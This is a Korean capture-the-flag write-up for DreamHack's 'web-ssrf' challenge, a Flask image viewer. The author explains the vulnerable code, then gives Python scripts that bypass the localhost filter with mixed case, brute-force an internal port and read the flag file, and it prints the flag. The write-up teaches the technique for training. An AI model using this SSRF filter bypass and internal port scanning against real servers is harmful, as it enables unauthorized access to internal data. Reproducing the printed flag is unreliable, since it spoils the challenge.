# [DreamHack] web-ssrf

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> flask로 작성된 image viewer 서비스 입니다.
>
> SSRF 취약점을 이용해 플래그를 획득하세요. 플래그는 `/app/flag.txt`에 있습니다.
>
> Release: [web-ssrf.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8560691/web-ssrf.zip)

## Analysis

### /img_viewer

```python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "") # url 입력
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url # url에 host/port를 명시하지 않을 경우 localhost:8000으로 설정
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc): # 'localhost' / '127.0.0.1' 필터링
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content # url에 접속 요청
            img = base64.b64encode(data).decode("utf8") # 응답 이미지를 받아옴
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```

GET으로 `url`을 받아오는데, `url`은 두 가지 형태가 될 수 있다.

- `url`에 host를 명시할 경우: host에 `localhost`와 `127.0.0.1`은 사용할 수 없다.
- `url`에 host를 명시하지 않을 경우: `localhost:8000`으로 설정한다.

서버에서 `url`에 접속 요청을 보내고, 응답을 base64 인코딩해서 출력한다.

### run_local_server()

```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)

def run_local_server():
    local_server.serve_forever()

threading._start_new_thread(run_local_server, ())
```

`localhost`의 1500부터 1800 사이의 랜덤 포트에 HTTP 서버를 연다. 맞는 포트에 접근하면 서버의 리소스를 반환해준다.

## Exploit

### Figure out random port number

먼저 몇 번 포트에 서버가 열렸는지 브루트포싱을 통해 알아내야 한다.

```python
# figure out random port number
for port in range(1500, 1800):
    res = requests.post('http://host1.dreamhack.games:24279/img_viewer', data={'url': 'http://Localhost:' + str(port)})
    print(port)
    if len(res.text) != 65121:
        print('random port: ' + str(port))
        break
```

`localhost` 필터링은 대문자를 섞어서 우회할 수 있다.

`url`에 접속 요청이 실패할 경우 `error.png`가 출력되고, 이때 `res.text`의 길이를 출력해보면 65121바이트인 것을 확인할 수 있다. 따라서 `res.text`의 길이가 65121이 아닌 경우의 포트 번호가 서버가 열려 있는 포트가 된다.

```
$ python3 solve.py 
1500
1501
1502
...
1522
random port: 1522
```

### Get flag

```python
port = 1522

res = requests.post('http://host1.dreamhack.games:24279/img_viewer', data={'url': 'http://Localhost:' + str(port)})
print(res.text)
```

서버에서 `localhost:1522`로 접속해보면 다음의 결과를 얻는다.

```
$ python3 solve.py
<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Image Viewer SSRF</title>



  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">SSRF</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#about">About</a></li>
            <li><a href="#contact">Contact</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">

<h1>Image Viewer</h1><br/>

  <img src="data:image/png;base64, PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgo8dGl0bGU+RGlyZWN0b3J5IGxpc3RpbmcgZm9yIC88L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+RGlyZWN0b3J5IGxpc3RpbmcgZm9yIC88L2gxPgo8aHI+Cjx1bD4KPGxpPjxhIGhyZWY9ImFwcC5weSI+YXBwLnB5PC9hPjwvbGk+CjxsaT48YSBocmVmPSJlcnJvci5wbmciPmVycm9yLnBuZzwvYT48L2xpPgo8bGk+PGEgaHJlZj0iZmxhZy50eHQiPmZsYWcudHh0PC9hPjwvbGk+CjxsaT48YSBocmVmPSJyZXF1aXJlbWVudHMudHh0Ij5yZXF1aXJlbWVudHMudHh0PC9hPjwvbGk+CjxsaT48YSBocmVmPSJzdGF0aWMvIj5zdGF0aWMvPC9hPjwvbGk+CjxsaT48YSBocmVmPSJ0ZW1wbGF0ZXMvIj50ZW1wbGF0ZXMvPC9hPjwvbGk+CjwvdWw+Cjxocj4KPC9ib2R5Pgo8L2h0bWw+Cg=="/>

<form method="POST">
  <div class="form-group">
    <label for="url">url</label>
    <input type="text" class="form-control" id="url" placeholder="url" name="url" value="/static/dream.png" required>
  </div>
  <button type="submit" class="btn btn-default">View</button>
</form>

    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

이미지를 디코딩하면 다음과 같다.

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="app.py">app.py</a></li>
<li><a href="error.png">error.png</a></li>
<li><a href="flag.txt">flag.txt</a></li>
<li><a href="requirements.txt">requirements.txt</a></li>
<li><a href="static/">static/</a></li>
<li><a href="templates/">templates/</a></li>
</ul>
<hr>
</body>
</html>
```

현재 디렉토리에 `flag.txt`가 있다. 따라서 `localhost:1522/flag.txt`로 접속하면 플래그를 획득할 수 있다.

```python
port = 1522

# get flag
res = requests.post('http://host1.dreamhack.games:24279/img_viewer', data={'url': 'http://Localhost:' + str(port) + '/flag.txt'})
print(res.text)
```

```
$ python3 solve.py
<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Image Viewer SSRF</title>



  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">SSRF</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#about">About</a></li>
            <li><a href="#contact">Contact</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">

<h1>Image Viewer</h1><br/>

  <img src="data:image/png;base64, REh7NDNkZDIxODkwNTY0NzVhN2YzYmQxMTQ1NmExN2FkNzF9"/>

<form method="POST">
  <div class="form-group">
    <label for="url">url</label>
    <input type="text" class="form-control" id="url" placeholder="url" name="url" value="/static/dream.png" required>
  </div>
  <button type="submit" class="btn btn-default">View</button>
</form>

    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

이미지를 디코딩하면 플래그가 된다.

```
flag: DH{43dd2189056475a7f3bd11456a17ad71}
```